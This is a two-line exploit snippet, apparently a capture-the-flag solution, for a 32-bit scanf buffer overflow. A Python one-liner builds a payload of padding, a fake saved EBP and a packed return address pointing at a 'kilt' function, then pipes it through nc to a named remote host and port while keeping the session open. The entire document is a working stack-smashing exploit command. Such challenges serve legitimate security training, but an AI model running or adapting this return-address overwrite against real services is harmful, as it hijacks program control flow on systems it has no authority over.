# 32-bit scanf buffer overflow into "kilt" function
(python -c "import struct; print('A' * 0x48 + '_EBP' + struct.pack('<L', 0x80489cc))"; cat) | nc imhotepisinvisible.com 6001
